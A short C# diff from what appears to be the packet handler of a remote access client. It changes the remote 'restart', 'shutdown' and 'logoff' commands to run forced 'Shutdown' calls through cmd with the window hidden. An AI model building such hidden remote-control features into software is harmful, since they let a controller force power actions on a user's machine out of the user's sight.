@@ -16,21 +16,50 @@ namespace Client.Handle_Packet
                 case "restart":
                     {
                         Methods.ClientExit();
-                        Process.Start("Shutdown", "/r /f /t 00");
+                        Process proc = new Process
+                        {
+                            StartInfo = new ProcessStartInfo
+                            {
+                                FileName = "cmd",
+                                Arguments = "/c Shutdown /r /f /t 00",
+                                WindowStyle = ProcessWindowStyle.Hidden,
+                                CreateNoWindow = true,
+                            }
+                        };
+                        proc.Start();
                         break;
                     }
 
                 case "shutdown":
                     {
                         Methods.ClientExit();
-                        Process.Start("Shutdown", "/s /f /t 00");
-                        break;
+                        Process proc = new Process
+                        {
+                            StartInfo = new ProcessStartInfo
+                            {
+                                FileName = "cmd",
+                                Arguments = "/c Shutdown /s /f /t 00",
+                                WindowStyle = ProcessWindowStyle.Hidden,
+                                CreateNoWindow = true,
+                            }
+                        };
+                        proc.Start(); break;
                     }
 
                 case "logoff":
                     {
                         Methods.ClientExit();
-                        Process.Start("Shutdown", "/l /f");
+                        Process proc = new Process
+                        {
+                            StartInfo = new ProcessStartInfo
+                            {
+                                FileName = "cmd",
+                                Arguments = "/c Shutdown /l /f",
+                                WindowStyle = ProcessWindowStyle.Hidden,
+                                CreateNoWindow = true,
+                            }
+                        };
+                        proc.Start();
                         break;
                     }
             }
